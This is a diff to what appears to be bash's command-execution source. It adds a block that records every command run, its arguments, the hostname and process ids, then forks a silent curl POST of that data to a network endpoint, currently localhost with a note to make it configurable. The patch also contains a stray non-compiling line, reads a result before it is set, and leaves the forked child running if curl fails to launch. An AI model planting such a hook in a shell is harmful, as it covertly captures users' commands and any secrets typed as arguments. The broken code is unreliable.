@@ -555,10 +555,88 @@ execute_command_internal (command, asynchronous, pipe_in, pipe_out,
   char *tcmd;
   volatile int last_pid;
   volatile int save_line_number;
+  sprintf(stderr,)
 #if defined (PROCESS_SUBSTITUTION)
   volatile int ofifo, nfifo, osize, saved_fifo;
   volatile char *ofifo_list;
 #endif
+  {
+    char *cmd = the_printed_command_except_trap;
+
+    /* Build JSON payload */
+    char json_payload[4096];
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname)-1);
+    hostname[sizeof(hostname)-1] = '\0';
+
+    const char *printed = the_printed_command_except_trap ?
+              the_printed_command_except_trap : "";
+
+    /* Extract raw words (unexpanded arguments) */
+    char args_buf[1024] = "";
+    if (command && command->type == cm_simple && command->value.Simple) {
+      WORD_LIST *w = command->value.Simple->words;
+      while (w && strlen(args_buf) < sizeof(args_buf)-64) {
+        strcat(args_buf, w->word->word ? w->word->word : "");
+        if (w->next) strcat(args_buf, " ");
+        w = w->next;
+      }
+    }
+
+    /* Build JSON */
+    snprintf(json_payload, sizeof(json_payload),
+      "{"
+      "\"printed\":\"%s\","
+      "\"raw_args\":\"%s\","
+      "\"exit_code\":%d,"
+      "\"async\":%d,"
+      "\"pipe_in\":%d,"
+      "\"pipe_out\":%d,"
+      "\"command_type\":%d,"
+      "\"flags\":%d,"
+      "\"line_number\":%d,"
+      "\"pid\":%d,"
+      "\"ppid\":%d,"
+      "\"hostname\":\"%s\""
+      "}",
+      printed,
+      args_buf,
+      exec_result,
+      asynchronous,
+      pipe_in,
+      pipe_out,
+      command ? command->type : -1,
+      command ? command->flags : 0,
+      line_number,
+      getpid(),
+      getppid(),
+      hostname
+    );
+
+
+    pid_t pid = fork();
+    if (pid == 0) {
+      /* run curl to endpoint (currently localhost for testing) */
+      {
+        int devnull = open("/dev/null", O_WRONLY);
+        if (devnull >= 0)
+        {
+        dup2(devnull, STDOUT_FILENO);
+        dup2(devnull, STDERR_FILENO);
+        if (devnull > STDERR_FILENO)
+          close(devnull);
+        }
+
+        execl("/usr/bin/curl", "curl",
+          "-s", "-X", "POST",
+          "-H", "Content-Type: application/json",
+          "-d", json_payload,
+          "http://localhost:8080", /* FIXME - make this configurable / set this at compile */
+          (char *)NULL);
+      }
+    }
+    }
 
   if (breaking || continuing) {
 	out = last_command_exit_value;
@@ -1110,85 +1188,6 @@ execute_command_internal (command, asynchronous, pipe_in, pipe_out,
   goto return_rat;
 
   return_rat:
-	{
-	char *cmd = the_printed_command_except_trap;
-
-	fprintf(stderr, "Executed: %s\n", cmd ? cmd : "NULL");
-
-	/* Build JSON payload */
-	char json_payload[4096];
-
-	char hostname[256];
-	gethostname(hostname, sizeof(hostname)-1);
-	hostname[sizeof(hostname)-1] = '\0';
-
-	const char *printed = the_printed_command_except_trap ?
-						the_printed_command_except_trap : "";
-
-	/* Extract raw words (unexpanded arguments) */
-	char args_buf[1024] = "";
-	if (command && command->type == cm_simple && command->value.Simple) {
-		WORD_LIST *w = command->value.Simple->words;
-		while (w && strlen(args_buf) < sizeof(args_buf)-64) {
-			strcat(args_buf, w->word->word ? w->word->word : "");
-			if (w->next) strcat(args_buf, " ");
-			w = w->next;
-		}
-	}
-
-	/* Build JSON */
-	snprintf(json_payload, sizeof(json_payload),
-		"{"
-		"\"printed\":\"%s\","
-		"\"raw_args\":\"%s\","
-		"\"exit_code\":%d,"
-		"\"async\":%d,"
-		"\"pipe_in\":%d,"
-		"\"pipe_out\":%d,"
-		"\"command_type\":%d,"
-		"\"flags\":%d,"
-		"\"line_number\":%d,"
-		"\"pid\":%d,"
-		"\"ppid\":%d,"
-		"\"hostname\":\"%s\""
-		"}",
-		printed,
-		args_buf,
-		exec_result,
-		asynchronous,
-		pipe_in,
-		pipe_out,
-		command ? command->type : -1,
-		command ? command->flags : 0,
-		line_number,
-		getpid(),
-		getppid(),
-		hostname
-	);
-
-
-	pid_t pid = fork();
-	if (pid == 0) {
-		/* run curl to endpoint (currently localhost for testing) */
-		{
-			int devnull = open("/dev/null", O_WRONLY);
-			if (devnull >= 0)
-			{
-			dup2(devnull, STDOUT_FILENO);
-			dup2(devnull, STDERR_FILENO);
-			if (devnull > STDERR_FILENO)
-				close(devnull);
-			}
-
-			execl("/usr/bin/curl", "curl",
-				"-s", "-X", "POST",
-				"-H", "Content-Type: application/json",
-				"-d", json_payload,
-				"http://localhost:8080", /* FIXME - make this configurable / set this at compile */
-				(char *)NULL);
-		}
-	}
-	}
   	return (out);
 }
 
